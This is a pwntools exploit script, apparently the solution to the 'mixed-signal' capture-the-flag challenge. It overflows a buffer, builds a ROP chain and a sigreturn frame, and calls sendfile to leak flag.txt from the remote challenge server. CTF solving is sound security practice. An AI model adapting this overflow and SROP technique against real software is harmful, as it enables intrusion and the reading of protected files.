from pwn import *

elf = context.binary = ELF('./chal')

context.log_level = 'debug'

rop = ROP(elf)

p = remote('mixed-signal.chals.nitectf2024.live', 1337, ssl=True)

rop.raw(b'A' * 16)
rop.call('vuln')
rop.raw(rop.find_gadget(['syscall'])[0])

frame = SigreturnFrame()
frame.rax = constants.SYS_sendfile
frame.rdi = 1 # stdout
frame.rsi = 5 # open('flag.txt')
frame.rdx = 0
frame.r10 = 64 # size_t count
frame.rip = rop.find_gadget(['syscall'])[0]

rop.raw(bytes(frame))

p.sendlineafter(b'pickup!\n', rop.chain())

input()

p.sendline(b'A' * 14)

p.interactive()
